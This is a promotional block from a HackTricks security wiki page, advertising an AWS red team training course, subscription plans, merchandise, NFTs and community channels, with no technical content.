<summary><strong>Learn AWS hacking from zero to hero with</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Other ways to support HackTricks:

* If you want to see your **company advertised in HackTricks** or **download HackTricks in PDF** Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Share your hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
